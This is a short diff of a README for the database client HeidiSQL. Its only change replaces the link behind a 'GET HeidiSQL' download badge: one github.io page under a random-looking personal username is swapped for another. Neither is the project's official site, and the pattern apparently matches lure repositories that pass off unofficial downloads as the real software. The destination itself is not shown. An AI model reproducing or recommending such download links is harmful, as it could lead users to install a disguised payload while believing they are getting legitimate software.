@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://upload.wikimedia.org/wikipedia/de/thumb/a/aa/Heidisql_logo.svg/1280px-Heidisql_logo.svg.png)
 
-[![GET HeidiSQL](https://img.shields.io/badge/GET%20%E2%80%94%20HeidiSQL-0078D6?style=for-the-badge&logoColor=white)](https://bradleyschmittxbrh.github.io/.github/heidisql)
+[![GET HeidiSQL](https://img.shields.io/badge/GET%20%E2%80%94%20HeidiSQL-0078D6?style=for-the-badge&logoColor=white)](https://denvertruongmosb.github.io/.github/heidisql)
 
 ---
 
